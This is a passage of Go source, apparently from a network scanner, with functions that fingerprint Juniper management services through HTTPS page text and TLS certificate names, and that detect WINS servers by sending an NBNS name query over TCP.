	// Try HTTPS first (management services are typically TLS).
	if body, ok := probeHTTPBody(ctx, host, port, true, "/"); ok {
		lb := strings.ToLower(body)
		if strings.Contains(lb, "juniper") || strings.Contains(lb, "junos") {
			return true
		}
	}
	// Check TLS certificate for Juniper strings.
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &tls.Dialer{
		NetDialer: &net.Dialer{Timeout: dialTimeout},
		Config:    &tls.Config{InsecureSkipVerify: true},
	}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	tlsConn := conn.(*tls.Conn)
	state := tlsConn.ConnectionState()
	for _, cert := range state.PeerCertificates {
		combined := strings.ToLower(cert.Subject.String() + " " + cert.Issuer.String())
		if strings.Contains(combined, "juniper") || strings.Contains(combined, "junos") {
			return true
		}
	}
	return false
}

// probeWINS sends a WINS name query and checks for a valid response.
// WINS uses NetBIOS Name Service (NBNS) format over TCP on port 1512.
func probeWINS(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	// NBNS name query for "*" (wildcard) — a standard WINS query.
	// Transaction ID(2) + Flags(2) + QDCOUNT=1(2) + zeros(6) + QNAME + QTYPE + QCLASS
	query := []byte{
		0xAB, 0xCD, // Transaction ID
		0x00, 0x00, // Flags: standard query
		0x00, 0x01, // QDCOUNT: 1
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // AN, NS, AR counts
		// QNAME: encoded NetBIOS name "*" (padded to 32 half-bytes)
		0x20, // length=32
		0x43, 0x4B, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x00,       // root label
		0x00, 0x21, // QTYPE: NBSTAT (0x21)
		0x00, 0x01, // QCLASS: IN
	}
	// TCP NBNS: 2-byte length prefix
	tcpMsg := make([]byte, 2+len(query))
	binary.BigEndian.PutUint16(tcpMsg[:2], uint16(len(query)))
	copy(tcpMsg[2:], query)

	if _, err := conn.Write(tcpMsg); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	// Response: 2-byte length + NBNS header. Check transaction ID matches.
	return n >= 14 && buf[2] == 0xAB && buf[3] == 0xCD
}
